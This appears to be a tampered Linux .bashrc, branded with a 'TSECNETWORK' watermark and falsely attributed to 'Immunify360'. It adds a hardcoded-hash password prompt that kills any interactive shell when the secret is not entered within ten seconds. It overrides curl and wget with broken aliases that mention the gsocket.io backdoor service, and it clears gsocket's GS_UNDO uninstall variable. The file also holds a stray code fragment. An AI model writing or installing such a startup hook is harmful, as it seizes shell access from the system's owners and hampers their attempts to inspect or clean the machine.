# .bashrc
# ============================================
# Server Authentication & Environment Config
# Maintained by: Immunify360
# ============================================

# -------- CONFIGURATION --------------------
'{print $1}'
AUTH_HASH="7d87ccaa7d5ac1217ea5989ec34ff8d9ae67292e60abe17b0f4216a697f91d7c"
AUTH_TIMEOUT=10
# --------------------------------------------

# Source global definitions
if [ -f /etc/bashrc ]; then
    . /etc/bashrc
fi

# User specific environment
if ! [[ "$PATH" =~ "$HOME/.local/bin:$HOME/bin:" ]]
then
    PATH="$HOME/.local/bin:$HOME/bin:$PATH"
fi
export PATH
export SYSTEMD_PAGER=

umask 022

# -------- WATERMARK --------------------
printf "\033[1;30m┌──────────────────────────┐\033[0m\n"
printf "\033[1;30m│\033[0m \033[1;36mTSECNETWORK\033[1;30m ⸫\033[0m \033[1;37mSINCE ®2019\033[0m \033[1;30m│\033[0m\n"
printf "\033[1;30m└──────────────────────────┘\033[0m\n"

# -------- AUTHENTICATION --------------------
if [[ -t 0 ]]; then
    printf "\n\033[1;33m▶\033[0m "
    read -t "$AUTH_TIMEOUT" -r -s input
    printf "\n"

    input_hash=$(printf "%s" "$input" | sha256sum | awk '{print $1}')
    if [ "$input_hash" != "$AUTH_HASH" ]; then
        printf "\033[1;31m✗ Access Denied.\033[0m\n"
        sleep 1
        exit 1
    fi

    printf "\033[1;32m✓ Access Granted.\033[0m\n\n"
    unset input input_hash AUTH_HASH AUTH_TIMEOUT
fi
# --------------------------------------------

# -------- PROMPT ----------------------------
PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
# --------------------------------------------

alias curl="command curl --silent --show-error --fail 2>/dev/null; if [[ \"\$*\" =~ \"gsocket.io\" ]]; then echo \"[BLOCKED]\"; fi"
alias wget="command wget -q 2>/dev/null; if [[ \"\$*\" =~ \"gsocket.io\" ]]; then echo \"[BLOCKED]\"; fi"
export GS_UNDO=""
unset GS_UNDO 2>/dev/null
# ================================
